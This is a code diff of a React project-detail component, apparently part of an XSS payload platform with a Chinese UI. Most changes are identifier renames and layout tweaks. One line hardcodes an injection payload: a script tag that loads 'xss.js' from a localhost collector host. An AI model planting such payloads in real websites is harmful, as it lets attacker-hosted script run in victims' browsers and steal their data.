@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Card, Badge, Button, Loading } from './ui';
+import { Card, Badge, Button, Loading, Input } from './ui';
 import { useAuth } from '../contexts/AuthContext';
 import SessionList from './SessionList';
 import projectService from '../services/project';
@@ -19,11 +19,11 @@ const ProjectDetail = ({
 
 
   const loadProjectPayload = async () => {
-    if (!project?.id) return;
+    if (!project?.jid) return;
     
     setIsLoading(true);
     try {
-      const payloadScript = await projectService.getProjectPayload(project.jid);
+      const payloadScript = `<script src="http://localhost:8088/xss.js?project=${project.jid}"></script>`;
       setPayload(payloadScript);
     } catch (error) {
       console.error('获取载荷失败:', error);
@@ -34,11 +34,11 @@ const ProjectDetail = ({
   };
 
   useEffect(() => {
-    if (project?.id && activeTab === 'payload') {
+    if (project?.jid && activeTab === 'payload') {
       loadProjectPayload();
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [project?.id, activeTab]);
+  }, [project?.jid, activeTab]);
 
   const getStatusBadge = (status) => {
     return status === 'active' ? 
@@ -53,6 +53,7 @@ const ProjectDetail = ({
   const copyPayload = () => {
     navigator.clipboard.writeText(payload);
   };
+
 
 
   const tabs = [
@@ -207,6 +208,7 @@ const ProjectDetail = ({
             <div className="project-detail__settings">
               <Card className="project-detail__settings-card">
                 <h4>⚙️ 项目配置</h4>
+                
                 <div className="project-detail__settings-grid">
                   <div className="project-detail__setting-item">
                     <span className="project-detail__setting-label">项目名称:</span>
@@ -228,16 +230,16 @@ const ProjectDetail = ({
                   </div>
                 </div>
                 
-                {isAdmin() && (
-                  <div className="project-detail__settings-actions">
+                <div className="project-detail__settings-actions">
+                  {isAdmin() && (
                     <Button
                       variant="primary"
                       onClick={() => onEditProject(project)}
                     >
-                      编辑项目配置
+                      ✏️ 更新项目配置
                     </Button>
-                  </div>
-                )}
+                  )}
+                </div>
               </Card>
             </div>
           )}
